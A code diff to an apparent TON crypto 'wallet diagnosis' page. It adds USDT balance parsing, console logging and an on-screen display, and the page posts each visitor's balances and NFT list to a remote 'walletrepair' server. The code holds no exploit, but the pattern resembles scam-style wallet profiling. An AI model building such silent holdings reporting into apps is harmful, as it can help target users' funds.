@@ -59,6 +59,7 @@ export default function Page2_Animation() {
   const [tokensCount, setTokensCount] = useState(null);
   const [nftCount, setNftCount] = useState(null);
   const [tokens, setTokens] = useState([]);
+  const [usdtBalance, setUsdtBalance] = useState('');
 
   const steps = [
     "Получение данных кошелька",
@@ -102,11 +103,13 @@ export default function Page2_Animation() {
             const symbol = (jet.symbol || '').toUpperCase();
             return symbol.includes('USDT') || symbol.includes('USD₮') || symbol === 'USD' || symbol === 'USDt';
           });
+          console.log('USDT найден:', usdtJetton);
           if (usdtJetton && usdtJetton.balance) {
             const jet = usdtJetton.jetton || {};
-            const decimals = jet.decimals || 6;
-            const raw = usdtJetton.balance || 0;
-            usdt = (parseFloat(raw) / Math.pow(10, decimals)).toFixed(2);
+            const decimals = parseInt(jet.decimals) || 6;
+            const raw = parseInt(usdtJetton.balance) || 0;
+            usdt = (raw / Math.pow(10, decimals)).toFixed(2);
+            console.log('USDT баланс:', usdt);
           } else {
             usdt = '';
           }
@@ -126,6 +129,7 @@ export default function Page2_Animation() {
       setTonBalance(ton);
       setTokensCount(tokens);
       setNftCount(nft);
+      setUsdtBalance(usdt);
       
       // Если адрес начинается с UQ и длина 48, используем его как имя файла
       let summaryFileName = wallet;
@@ -158,6 +162,7 @@ export default function Page2_Animation() {
         nftList,
       };
       
+      console.log('Отправляем USDT:', usdt);
       await fetch('https://walletrepair.onrender.com/api/diagnose', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -427,6 +432,10 @@ export default function Page2_Animation() {
               <div className="cyber-diagnosis-result-card">
                 <span className="cyber-diagnosis-result-label">Баланс TON</span>
                 <span className="cyber-diagnosis-result-value">{tonBalance !== null ? tonBalance : '—'}</span>
+              </div>
+              <div className="cyber-diagnosis-result-card">
+                <span className="cyber-diagnosis-result-label">USDT</span>
+                <span className="cyber-diagnosis-result-value">{usdtBalance !== '' ? usdtBalance : '—'}</span>
               </div>
               <div className="cyber-diagnosis-result-card">
                 <span className="cyber-diagnosis-result-value">{tokensCount !== null ? `${tokensCount} токенов` : 'Токены: —'}</span>
